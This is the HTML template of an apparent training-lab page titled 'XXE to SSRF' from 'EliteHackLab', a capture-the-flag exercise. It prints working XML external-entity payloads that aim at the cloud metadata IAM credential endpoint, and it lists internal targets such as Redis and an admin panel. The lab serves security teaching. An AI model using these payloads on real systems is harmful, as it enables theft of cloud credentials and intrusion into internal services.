<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1>📄 XXE to SSRF</h1><div class="lab-info"><span class="lab-tag difficulty-hard">Hard</span></div></div>
    <div class="lab-section">
      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
      <p>Use XXE to make the server fetch internal resources (SSRF). Access the cloud metadata endpoint or internal admin panel.</p>
    </div>
    <div class="lab-section">
      <h2><i class="fas fa-terminal"></i> XXE-SSRF Payload</h2>
      <div class="code-block">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role"&gt;
]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;

Other internal targets:
- http://localhost:3000/labs/ssrf/internal/admin
- http://127.0.0.1:6379/ (Redis)
- http://169.254.169.254/latest/user-data/</div>
      <div class="vulnerable-form">
        <textarea id="xxeSsrf" rows="6">&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
]&gt;
&lt;data&gt;&amp;xxe;&lt;/data&gt;</textarea>
        <button onclick="submitXxeSsrf()" class="btn">Parse</button>
      </div>
      <div id="xxeSsrfResult" class="result-box" style="margin-top:1rem;"></div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('xxe-basic','flagInput_xxe3','flagResult_xxe3'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_xxe3" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_xxe3" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function submitXxeSsrf() {
      const res = await fetch('/labs/xxe/basic/parse', { method:'POST', headers:{'Content-Type':'text/plain'}, body:document.getElementById('xxeSsrf').value });
      document.getElementById('xxeSsrfResult').innerHTML = '<pre>'+JSON.stringify(await res.json(),null,2)+'</pre>';
    }
  </script>
</body>
</html>
